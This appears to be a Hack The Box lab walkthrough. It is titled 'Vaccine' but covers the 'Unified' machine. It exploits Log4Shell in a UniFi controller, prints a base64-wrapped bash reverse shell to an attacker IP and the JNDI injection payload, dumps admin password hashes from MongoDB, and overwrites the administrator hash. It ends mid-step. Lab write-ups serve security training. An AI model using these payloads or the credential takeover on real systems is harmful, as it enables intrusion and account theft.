# Vaccine

URL: https://app.hackthebox.com/starting-point

Level: Very Easy

Start time: 20 Feb 2022, 5:34pm GMT+1

End time: 20 Feb 2022, 6:11am GMT+1


## Walkthrough

### Enumeration

#### NMAP

Basic nmap scan:

```
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-20 18:35 CET
Nmap scan report for 10.129.93.96
Host is up (0.071s latency).
Not shown: 65529 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
6789/tcp open  ibm-db2-admin
8080/tcp open  http-proxy
8443/tcp open  https-alt
8843/tcp open  unknown
8880/tcp open  cddbp-alt

Nmap done: 1 IP address (1 host up) scanned in 15.67 seconds
```

Again, with -sC -sV:

```
root@kaligra:/opt/htb-startingpoint/Unified# nmap -T4 -p22,6789,8080,8443,8843,8880 -sC -sV 10.129.93.96 -oN 02_nmap
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-20 18:36 CET
Stats: 0:01:47 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 83.33% done; ETC: 18:38 (0:00:21 remaining)
Nmap scan report for 10.129.93.96
Host is up (0.083s latency).

PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
6789/tcp open  ibm-db2-admin?
8080/tcp open  http-proxy
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.1 404
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 431
|     Date: Sun, 20 Feb 2022 17:48:08 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 404
|     Found</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 404
|     Found</h1></body></html>
|   GetRequest, HTTPOptions:
|     HTTP/1.1 302
|     Location: http://localhost:8080/manage
|     Content-Length: 0
|     Date: Sun, 20 Feb 2022 17:48:07 GMT
|     Connection: close
|   RTSPRequest:
|     HTTP/1.1 400
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 435
|     Date: Sun, 20 Feb 2022 17:48:07 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400
|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400
|     Request</h1></body></html>
|   Socks5:
|     HTTP/1.1 400
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 435
|     Date: Sun, 20 Feb 2022 17:48:08 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400
|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400
|_    Request</h1></body></html>
|_http-title: Did not follow redirect to https://10.129.93.96:8443/manage
|_http-open-proxy: Proxy might be redirecting requests
8443/tcp open  ssl/nagios-nsca Nagios NSCA
| http-title: UniFi Network
|_Requested resource was /manage/account/login?redirect=%2Fmanage
| ssl-cert: Subject: commonName=UniFi/organizationName=Ubiquiti Inc./stateOrProvinceName=New York/countryName=US
| Subject Alternative Name: DNS:UniFi
| Not valid before: 2021-12-30T21:37:24
|_Not valid after:  2024-04-03T21:37:24
8843/tcp open  ssl/unknown
| fingerprint-strings:
|   GetRequest, HTTPOptions:
|     HTTP/1.1 400
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 435
|     Date: Sun, 20 Feb 2022 17:48:27 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400
|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400
|     Request</h1></body></html>
|   RTSPRequest:
|     HTTP/1.1 400
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 435
|     Date: Sun, 20 Feb 2022 17:48:28 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400
|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400
|_    Request</h1></body></html>
| ssl-cert: Subject: commonName=UniFi/organizationName=Ubiquiti Inc./stateOrProvinceName=New York/countryName=US
| Subject Alternative Name: DNS:UniFi
| Not valid before: 2021-12-30T21:37:24
|_Not valid after:  2024-04-03T21:37:24
8880/tcp open  cddbp-alt?
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.1 404
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 431
|     Date: Sun, 20 Feb 2022 17:48:07 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 404
|     Found</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 404
|     Found</h1></body></html>
|   GetRequest:
|     HTTP/1.1 400
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 435
|     Date: Sun, 20 Feb 2022 17:48:07 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400
|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400
|     Request</h1></body></html>
|   HTTPOptions:
|     HTTP/1.1 400
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 435
|     Date: Sun, 20 Feb 2022 17:48:14 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400
|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400
|_    Request</h1></body></html>
3 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port8080-TCP:V=7.92%I=7%D=2/20%Time=62127C28%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,84,"HTTP/1\.1\x20302\x20\r\nLocation:\x20http://localhost:8080
SF:/manage\r\nContent-Length:\x200\r\nDate:\x20Sun,\x2020\x20Feb\x202022\x
SF:2017:48:07\x20GMT\r\nConnection:\x20close\r\n\r\n")%r(HTTPOptions,84,"H
SF:TTP/1\.1\x20302\x20\r\nLocation:\x20http://localhost:8080/manage\r\nCon
SF:tent-Length:\x200\r\nDate:\x20Sun,\x2020\x20Feb\x202022\x2017:48:07\x20
SF:GMT\r\nConnection:\x20close\r\n\r\n")%r(RTSPRequest,24E,"HTTP/1\.1\x204
SF:00\x20\r\nContent-Type:\x20text/html;charset=utf-8\r\nContent-Language:
SF:\x20en\r\nContent-Length:\x20435\r\nDate:\x20Sun,\x2020\x20Feb\x202022\
SF:x2017:48:07\x20GMT\r\nConnection:\x20close\r\n\r\n<!doctype\x20html><ht
SF:ml\x20lang=\"en\"><head><title>HTTP\x20Status\x20400\x20\xe2\x80\x93\x2
SF:0Bad\x20Request</title><style\x20type=\"text/css\">body\x20{font-family
SF::Tahoma,Arial,sans-serif;}\x20h1,\x20h2,\x20h3,\x20b\x20{color:white;ba
SF:ckground-color:#525D76;}\x20h1\x20{font-size:22px;}\x20h2\x20{font-size
SF::16px;}\x20h3\x20{font-size:14px;}\x20p\x20{font-size:12px;}\x20a\x20{c
SF:olor:black;}\x20\.line\x20{height:1px;background-color:#525D76;border:n
SF:one;}</style></head><body><h1>HTTP\x20Status\x20400\x20\xe2\x80\x93\x20
SF:Bad\x20Request</h1></body></html>")%r(FourOhFourRequest,24A,"HTTP/1\.1\
SF:x20404\x20\r\nContent-Type:\x20text/html;charset=utf-8\r\nContent-Langu
SF:age:\x20en\r\nContent-Length:\x20431\r\nDate:\x20Sun,\x2020\x20Feb\x202
SF:022\x2017:48:08\x20GMT\r\nConnection:\x20close\r\n\r\n<!doctype\x20html
SF:><html\x20lang=\"en\"><head><title>HTTP\x20Status\x20404\x20\xe2\x80\x9
SF:3\x20Not\x20Found</title><style\x20type=\"text/css\">body\x20{font-fami
SF:ly:Tahoma,Arial,sans-serif;}\x20h1,\x20h2,\x20h3,\x20b\x20{color:white;
SF:background-color:#525D76;}\x20h1\x20{font-size:22px;}\x20h2\x20{font-si
SF:ze:16px;}\x20h3\x20{font-size:14px;}\x20p\x20{font-size:12px;}\x20a\x20
SF:{color:black;}\x20\.line\x20{height:1px;background-color:#525D76;border
SF::none;}</style></head><body><h1>HTTP\x20Status\x20404\x20\xe2\x80\x93\x
SF:20Not\x20Found</h1></body></html>")%r(Socks5,24E,"HTTP/1\.1\x20400\x20\
SF:r\nContent-Type:\x20text/html;charset=utf-8\r\nContent-Language:\x20en\
SF:r\nContent-Length:\x20435\r\nDate:\x20Sun,\x2020\x20Feb\x202022\x2017:4
SF:8:08\x20GMT\r\nConnection:\x20close\r\n\r\n<!doctype\x20html><html\x20l
SF:ang=\"en\"><head><title>HTTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x2
SF:0Request</title><style\x20type=\"text/css\">body\x20{font-family:Tahoma
SF:,Arial,sans-serif;}\x20h1,\x20h2,\x20h3,\x20b\x20{color:white;backgroun
SF:d-color:#525D76;}\x20h1\x20{font-size:22px;}\x20h2\x20{font-size:16px;}
SF:\x20h3\x20{font-size:14px;}\x20p\x20{font-size:12px;}\x20a\x20{color:bl
SF:ack;}\x20\.line\x20{height:1px;background-color:#525D76;border:none;}</
SF:style></head><body><h1>HTTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x20
SF:Request</h1></body></html>");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port8843-TCP:V=7.92%T=SSL%I=7%D=2/20%Time=62127C3B%P=x86_64-pc-linux-gn
SF:u%r(GetRequest,24E,"HTTP/1\.1\x20400\x20\r\nContent-Type:\x20text/html;
SF:charset=utf-8\r\nContent-Language:\x20en\r\nContent-Length:\x20435\r\nD
SF:ate:\x20Sun,\x2020\x20Feb\x202022\x2017:48:27\x20GMT\r\nConnection:\x20
SF:close\r\n\r\n<!doctype\x20html><html\x20lang=\"en\"><head><title>HTTP\x
SF:20Status\x20400\x20\xe2\x80\x93\x20Bad\x20Request</title><style\x20type
SF:=\"text/css\">body\x20{font-family:Tahoma,Arial,sans-serif;}\x20h1,\x20
SF:h2,\x20h3,\x20b\x20{color:white;background-color:#525D76;}\x20h1\x20{fo
SF:nt-size:22px;}\x20h2\x20{font-size:16px;}\x20h3\x20{font-size:14px;}\x2
SF:0p\x20{font-size:12px;}\x20a\x20{color:black;}\x20\.line\x20{height:1px
SF:;background-color:#525D76;border:none;}</style></head><body><h1>HTTP\x2
SF:0Status\x20400\x20\xe2\x80\x93\x20Bad\x20Request</h1></body></html>")%r
SF:(HTTPOptions,24E,"HTTP/1\.1\x20400\x20\r\nContent-Type:\x20text/html;ch
SF:arset=utf-8\r\nContent-Language:\x20en\r\nContent-Length:\x20435\r\nDat
SF:e:\x20Sun,\x2020\x20Feb\x202022\x2017:48:27\x20GMT\r\nConnection:\x20cl
SF:ose\r\n\r\n<!doctype\x20html><html\x20lang=\"en\"><head><title>HTTP\x20
SF:Status\x20400\x20\xe2\x80\x93\x20Bad\x20Request</title><style\x20type=\
SF:"text/css\">body\x20{font-family:Tahoma,Arial,sans-serif;}\x20h1,\x20h2
SF:,\x20h3,\x20b\x20{color:white;background-color:#525D76;}\x20h1\x20{font
SF:-size:22px;}\x20h2\x20{font-size:16px;}\x20h3\x20{font-size:14px;}\x20p
SF:\x20{font-size:12px;}\x20a\x20{color:black;}\x20\.line\x20{height:1px;b
SF:ackground-color:#525D76;border:none;}</style></head><body><h1>HTTP\x20S
SF:tatus\x20400\x20\xe2\x80\x93\x20Bad\x20Request</h1></body></html>")%r(R
SF:TSPRequest,24E,"HTTP/1\.1\x20400\x20\r\nContent-Type:\x20text/html;char
SF:set=utf-8\r\nContent-Language:\x20en\r\nContent-Length:\x20435\r\nDate:
SF:\x20Sun,\x2020\x20Feb\x202022\x2017:48:28\x20GMT\r\nConnection:\x20clos
SF:e\r\n\r\n<!doctype\x20html><html\x20lang=\"en\"><head><title>HTTP\x20St
SF:atus\x20400\x20\xe2\x80\x93\x20Bad\x20Request</title><style\x20type=\"t
SF:ext/css\">body\x20{font-family:Tahoma,Arial,sans-serif;}\x20h1,\x20h2,\
SF:x20h3,\x20b\x20{color:white;background-color:#525D76;}\x20h1\x20{font-s
SF:ize:22px;}\x20h2\x20{font-size:16px;}\x20h3\x20{font-size:14px;}\x20p\x
SF:20{font-size:12px;}\x20a\x20{color:black;}\x20\.line\x20{height:1px;bac
SF:kground-color:#525D76;border:none;}</style></head><body><h1>HTTP\x20Sta
SF:tus\x20400\x20\xe2\x80\x93\x20Bad\x20Request</h1></body></html>");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port8880-TCP:V=7.92%I=7%D=2/20%Time=62127C29%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,24E,"HTTP/1\.1\x20400\x20\r\nContent-Type:\x20text/html;charse
SF:t=utf-8\r\nContent-Language:\x20en\r\nContent-Length:\x20435\r\nDate:\x
SF:20Sun,\x2020\x20Feb\x202022\x2017:48:07\x20GMT\r\nConnection:\x20close\
SF:r\n\r\n<!doctype\x20html><html\x20lang=\"en\"><head><title>HTTP\x20Stat
SF:us\x20400\x20\xe2\x80\x93\x20Bad\x20Request</title><style\x20type=\"tex
SF:t/css\">body\x20{font-family:Tahoma,Arial,sans-serif;}\x20h1,\x20h2,\x2
SF:0h3,\x20b\x20{color:white;background-color:#525D76;}\x20h1\x20{font-siz
SF:e:22px;}\x20h2\x20{font-size:16px;}\x20h3\x20{font-size:14px;}\x20p\x20
SF:{font-size:12px;}\x20a\x20{color:black;}\x20\.line\x20{height:1px;backg
SF:round-color:#525D76;border:none;}</style></head><body><h1>HTTP\x20Statu
SF:s\x20400\x20\xe2\x80\x93\x20Bad\x20Request</h1></body></html>")%r(FourO
SF:hFourRequest,24A,"HTTP/1\.1\x20404\x20\r\nContent-Type:\x20text/html;ch
SF:arset=utf-8\r\nContent-Language:\x20en\r\nContent-Length:\x20431\r\nDat
SF:e:\x20Sun,\x2020\x20Feb\x202022\x2017:48:07\x20GMT\r\nConnection:\x20cl
SF:ose\r\n\r\n<!doctype\x20html><html\x20lang=\"en\"><head><title>HTTP\x20
SF:Status\x20404\x20\xe2\x80\x93\x20Not\x20Found</title><style\x20type=\"t
SF:ext/css\">body\x20{font-family:Tahoma,Arial,sans-serif;}\x20h1,\x20h2,\
SF:x20h3,\x20b\x20{color:white;background-color:#525D76;}\x20h1\x20{font-s
SF:ize:22px;}\x20h2\x20{font-size:16px;}\x20h3\x20{font-size:14px;}\x20p\x
SF:20{font-size:12px;}\x20a\x20{color:black;}\x20\.line\x20{height:1px;bac
SF:kground-color:#525D76;border:none;}</style></head><body><h1>HTTP\x20Sta
SF:tus\x20404\x20\xe2\x80\x93\x20Not\x20Found</h1></body></html>")%r(HTTPO
SF:ptions,24E,"HTTP/1\.1\x20400\x20\r\nContent-Type:\x20text/html;charset=
SF:utf-8\r\nContent-Language:\x20en\r\nContent-Length:\x20435\r\nDate:\x20
SF:Sun,\x2020\x20Feb\x202022\x2017:48:14\x20GMT\r\nConnection:\x20close\r\
SF:n\r\n<!doctype\x20html><html\x20lang=\"en\"><head><title>HTTP\x20Status
SF:\x20400\x20\xe2\x80\x93\x20Bad\x20Request</title><style\x20type=\"text/
SF:css\">body\x20{font-family:Tahoma,Arial,sans-serif;}\x20h1,\x20h2,\x20h
SF:3,\x20b\x20{color:white;background-color:#525D76;}\x20h1\x20{font-size:
SF:22px;}\x20h2\x20{font-size:16px;}\x20h3\x20{font-size:14px;}\x20p\x20{f
SF:ont-size:12px;}\x20a\x20{color:black;}\x20\.line\x20{height:1px;backgro
SF:und-color:#525D76;border:none;}</style></head><body><h1>HTTP\x20Status\
SF:x20400\x20\xe2\x80\x93\x20Bad\x20Request</h1></body></html>");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 178.19 seconds
```

On port 8443 (https) we found Unifi Network version 6.4.54:

![Screenshot_2022-02-20_18-42-30](https://user-images.githubusercontent.com/42389836/154856261-10f62dc5-d333-4793-86c5-69fada7e27b7.png)

We search on Google ("unifi 6.4.54 exploit") and we found a CVE for this version:

https://community.ui.com/releases/UniFi-Network-Application-6-5-54/d717f241-48bb-4979-8b10-99db36ddabe1

By looking at CVE-2021-44228, we found this useful resource:

https://www.sprocketsecurity.com/blog/another-log4j-on-the-fire-unifi

#### Log4Unifi

We need to download this tool from github:

https://github.com/puzzlepeaches/Log4jUnifi

We install it in our `/opt/tools` folder:

```
root@kaligra:/opt/tools# git clone --recurse-submodules https://github.com/puzzlepeaches/Log4jUnifi     && cd Log4jUnifi && pip3 install -r requirements.txt
Cloning into 'Log4jUnifi'...
remote: Enumerating objects: 18, done.
remote: Counting objects: 100% (18/18), done.
remote: Compressing objects: 100% (14/14), done.
remote: Total 18 (delta 5), reused 9 (delta 1), pack-reused 0
Receiving objects: 100% (18/18), 5.09 KiB | 521.00 KiB/s, done.
Resolving deltas: 100% (5/5), done.
Submodule 'utils/rogue-jndi' (https://github.com/veracode-research/rogue-jndi) registered for path 'utils/rogue-jndi'
Cloning into '/opt/tools/Log4jUnifi/utils/rogue-jndi'...
remote: Enumerating objects: 80, done.
remote: Counting objects: 100% (80/80), done.
remote: Compressing objects: 100% (55/55), done.
remote: Total 80 (delta 30), reused 53 (delta 16), pack-reused 0
Receiving objects: 100% (80/80), 24.50 KiB | 302.00 KiB/s, done.
Resolving deltas: 100% (30/30), done.
Submodule path 'utils/rogue-jndi': checked out '1aa5a5dfc09bfcd7dd50c617a6cd79167d5248d6'
Requirement already satisfied: requests in /usr/lib/python3/dist-packages (from -r requirements.txt (line 1)) (2.25.1)
```

We also need to install our "fake" jndi server:

```
root@kaligra:/opt/tools/Log4jUnifi# mvn package -f utils/rogue-jndi/
```

According to instructions, we need to create payload for our reverse shell.

Since our IP is `10.10.16.44` and we are going to listen on port `4444`:

```
root@kaligra:/opt/tools/Log4jUnifi/utils/rogue-jndi/target# echo 'bash -c bash -i >&/dev/tcp/10.10.16.44/4444 0>&1' | base64
YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTYuNDQvNDQ0NCAwPiYxCg==
```

Now we need to spawn our fake jndi server:

```
root@kaligra:/opt/tools/Log4jUnifi/utils/rogue-jndi/target# java -jar RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTYuNDQvNDQ0NCAwPiYxCg==}|{base64,-d}|{bash,-i}" --hostname "10.10.16.44"
+-+-+-+-+-+-+-+-+-+
|R|o|g|u|e|J|n|d|i|
+-+-+-+-+-+-+-+-+-+
Starting HTTP server on 0.0.0.0:8000
Starting LDAP server on 0.0.0.0:1389
Mapping ldap://10.10.16.44:1389/ to artsploit.controllers.RemoteReference
Mapping ldap://10.10.16.44:1389/o=reference to artsploit.controllers.RemoteReference
Mapping ldap://10.10.16.44:1389/o=websphere2 to artsploit.controllers.WebSphere2
Mapping ldap://10.10.16.44:1389/o=websphere2,jar=* to artsploit.controllers.WebSphere2
Mapping ldap://10.10.16.44:1389/o=groovy to artsploit.controllers.Groovy
Mapping ldap://10.10.16.44:1389/o=websphere1 to artsploit.controllers.WebSphere1
Mapping ldap://10.10.16.44:1389/o=websphere1,wsdl=* to artsploit.controllers.WebSphere1
Mapping ldap://10.10.16.44:1389/o=tomcat to artsploit.controllers.Tomcat
```

Of course we need to listen with netcat:

```
root@kaligra:~# nc -nvlp 4444
listening on [any] 4444 ...
```

Now we can run exploit:

```
root@kaligra:/opt/tools/Log4jUnifi# python3 exploit.py  -u https://10.129.93.96:8443 -i 10.10.16.44 -p 1389
[*] Starting malicous JNDI Server
{"username": "${jndi:ldap://10.10.16.44:1389/o=tomcat}", "password": "log4j", "remember": "${jndi:ldap://10.10.16.44:1389/o=tomcat}", "strict":true}
[*] Firing payload!
[*] Check for a callback!
```

and get a shell!

```
root@kaligra:~# nc -nvlp 4444
listening on [any] 4444 ...
connect to [10.10.16.44] from (UNKNOWN) [10.129.93.96] 55694
id
uid=999(unifi) gid=999(unifi) groups=999(unifi)
```

#### MongoDB

MongoDB is listening on port 27117/TCP (found with `netstat`) so we can access to database with:

```
mongo --port 27117
```

Now we are in Mongo shell.

We can enumerate databases:

```
show dbs
ace       0.002GB
ace_stat  0.000GB
admin     0.000GB
config    0.000GB
local     0.000GB
```

and we focus on `ace` (default Unifi database name):

```
use ace
switched to db ace
```

Now we can enumerate users:

```
db.admin.find()
{ "_id" : ObjectId("61ce278f46e0fb0012d47ee4"), "name" : "administrator", "email" : "administrator@unified.htb", "x_shadow" : "$6$Ry6Vdbse$8enMR5Znxoo.WfCMd/Xk65GwuQEPx1M.QP8/qHiQV0PvUc3uHuonK4WcTQFN1CRk3GwQaquyVwCVq8iQgPTt4.", "time_created" : NumberLong(1640900495), "last_site_name" : "default", "ui_settings" : { "neverCheckForUpdate" : true, "statisticsPrefferedTZ" : "SITE", "statisticsPreferBps" : "", "tables" : { "device" : { "sortBy" : "type", "isAscending" : true, "initialColumns" : [ "type", "deviceName", "status", "connection", "network", "ipAddress", "experience", "firmwareStatus", "downlink", "uplink", "dailyUsage" ], "columns" : [ "type", "deviceName", "status", "macAddress", "model", "ipAddress", "connection", "network", "experience", "firmwareStatus", "firmwareVersion", "memoryUsage", "cpuUsage", "loadAverage", "utilization", "clients", "lastSeen", "downlink", "uplink", "dailyUsage", "uptime", "wlan2g", "wlan5g", "radio2g", "radio5g", "clients2g", "clients5g", "bssid", "tx", "rx", "tx2g", "tx5g", "channel", "channel2g", "channel5g" ] }, "client" : { "sortBy" : "physicalName", "isAscending" : true, "initialColumns" : [ "status", "clientName", "physicalName", "connection", "ip", "experience", "Downlink", "Uplink", "dailyUsage" ], "columns" : [ "status", "clientName", "mac", "physicalName", "connection", "network", "interface", "wifi_band", "ip", "experience", "Downlink", "Uplink", "dailyUsage", "uptime", "channel", "Uplink_apPort", "signal", "txRate", "rxRate", "first_seen", "last_seen", "rx_packets", "tx_packets" ], "filters" : { "status" : { "active" : true }, "connection_type" : { "ng" : true, "na" : true, "wired" : true, "vpn" : true }, "clients_type" : { "users" : true, "guests" : true }, "device" : { "device" : "" } } }, "unifiDevice" : { "sortBy" : "type", "isAscending" : true, "columns" : [ "type", "name", "status", "macAddress", "model", "ipAddress", "connection", "network", "experience", "firmwareStatus", "firmwareVersion", "memoryUsage", "cpuUsage", "loadAverage", "utilization", "clients", "dailyUsage", "lastSeen", "downlink", "uplink", "uptime", "wlan2g", "wlan5g", "radio2g", "radio5g", "clients2g", "clients5g", "bssid", "tx", "rx", "tx2g", "tx5g", "channel", "channel2g", "channel5g" ], "initialColumns" : [ "type", "name", "status", "connection", "network", "ipAddress", "experience", "firmwareStatus", "downlink", "uplink", "dailyUsage" ] }, "unifiDeviceNetwork" : { "sortBy" : "type", "isAscending" : true, "columns" : [ "type", "name", "status", "macAddress", "model", "ipAddress", "connection", "network", "experience", "firmwareStatus", "firmwareVersion", "memoryUsage", "cpuUsage", "loadAverage", "utilization", "clients", "dailyUsage", "lastSeen", "downlink", "uplink", "uptime", "wlan2g", "wlan5g", "radio2g", "radio5g", "clients2g", "clients5g", "bssid", "tx", "rx", "tx2g", "tx5g", "channel", "channel2g", "channel5g" ], "initialColumns" : [ "type", "name", "status", "connection", "network", "ipAddress", "experience", "firmwareStatus", "downlink", "uplink", "dailyUsage" ] }, "unifiDeviceAccess" : { "sortBy" : "type", "isAscending" : true, "columns" : [ "type", "name", "status", "macAddress", "model", "ipAddress", "connection", "network", "experience", "firmwareStatus", "firmwareVersion", "memoryUsage", "cpuUsage", "loadAverage", "utilization", "clients", "dailyUsage", "lastSeen", "downlink", "uplink", "uptime", "wlan2g", "wlan5g", "radio2g", "radio5g", "clients2g", "clients5g", "bssid", "tx", "rx", "tx2g", "tx5g", "channel", "channel2g", "channel5g" ], "initialColumns" : [ "type", "name", "status", "connection", "network", "ipAddress", "experience", "firmwareStatus", "downlink", "uplink", "dailyUsage" ] }, "unifiDeviceProtect" : { "sortBy" : "type", "isAscending" : true, "columns" : [ "type", "name", "status", "macAddress", "model", "ipAddress", "connection", "network", "experience", "firmwareStatus", "firmwareVersion", "memoryUsage", "cpuUsage", "loadAverage", "utilization", "clients", "dailyUsage", "lastSeen", "downlink", "uplink", "uptime", "wlan2g", "wlan5g", "radio2g", "radio5g", "clients2g",
{ "_id" : ObjectId("61ce4a63fbce5e00116f424f"), "email" : "michael@unified.htb", "name" : "michael", "x_shadow" : "$6$spHwHYVF$mF/VQrMNGSau0IP7LjqQMfF5VjZBph6VUf4clW3SULqBjDNQwW.BlIqsafYbLWmKRhfWTiZLjhSP.D/M1h5yJ0", "requires_new_password" : false, "time_created" : NumberLong(1640909411), "last_site_name" : "default", "email_alert_enabled" : false, "email_alert_grouping_enabled" : false, "email_alert_grouping_delay" : 60, "push_alert_enabled" : false }
{ "_id" : ObjectId("61ce4ce8fbce5e00116f4251"), "email" : "seamus@unified.htb", "name" : "Seamus", "x_shadow" : "$6$NT.hcX..$aFei35dMy7Ddn.O.UFybjrAaRR5UfzzChhIeCs0lp1mmXhVHol6feKv4hj8LaGe0dTiyvq1tmA.j9.kfDP.xC.", "requires_new_password" : true, "time_created" : NumberLong(1640910056), "last_site_name" : "default" }
{ "_id" : ObjectId("61ce4d27fbce5e00116f4252"), "email" : "warren@unified.htb", "name" : "warren", "x_shadow" : "$6$DDOzp/8g$VXE2i.FgQSRJvTu.8G4jtxhJ8gm22FuCoQbAhhyLFCMcwX95ybr4dCJR/Otas100PZA9fHWgTpWYzth5KcaCZ.", "requires_new_password" : true, "time_created" : NumberLong(1640910119), "last_site_name" : "default" }
{ "_id" : ObjectId("61ce4d51fbce5e00116f4253"), "email" : "james@unfiied.htb", "name" : "james", "x_shadow" : "$6$ON/tM.23$cp3j11TkOCDVdy/DzOtpEbRC5mqbi1PPUM6N4ao3Bog8rO.ZGqn6Xysm3v0bKtyclltYmYvbXLhNybGyjvAey1", "requires_new_password" : false, "time_created" : NumberLong(1640910161), "last_site_name" : "default" }
```

Or (better):

```
db.admin.find().pretty()
{
        "_id" : ObjectId("61ce278f46e0fb0012d47ee4"),
        "name" : "administrator",
        "email" : "administrator@unified.htb",
        "x_shadow" : "$6$Ry6Vdbse$8enMR5Znxoo.WfCMd/Xk65GwuQEPx1M.QP8/qHiQV0PvUc3uHuonK4WcTQFN1CRk3GwQaquyVwCVq8iQgPTt4.",
        "time_created" : NumberLong(1640900495),
        "last_site_name" : "default",
        "ui_settings" : {
                "neverCheckForUpdate" : true,
                "statisticsPrefferedTZ" : "SITE",
                "statisticsPreferBps" : "",
                "tables" : {
                        "device" : {
                                "sortBy" : "type",
                                "isAscending" : true,
..
..
..
```

Now we can reset Unifi administrator password.

From this URL:

https://community.ui.com/questions/How-to-recover-access-to-a-unifi-controller-when-the-admin-password-has-been-lost-/bea32e54-c8cd-4d08-ba98-b836acebfeb4

we can use this update command:

```
db.admin.update( { name: "administrator" }, {$set: { x_shadow: "$6$9Ter1EZ9$lSt6/tkoPguHqsDK0mXmUsZ1WE2qCM4m9AQ.x9/eVNJxws.hAxt2Pe8oA9TFB7LPBgzaHBcAfKFoLpRQlpBiX1" } } );
WriteResult({ "nMatched" : 1, "nUpserted" : 0, "nModified" : 1 })
```

Now we can access through Unifi web interface:

![Screenshot_2022-02-20_23-09-33](https://user-images.githubusercontent.com/42389836/154867138-9ad5d0c3-f99f-48b1-a8bf-45beb9c81aa0.png)

And we can grab the "root" password from the Unifi site:

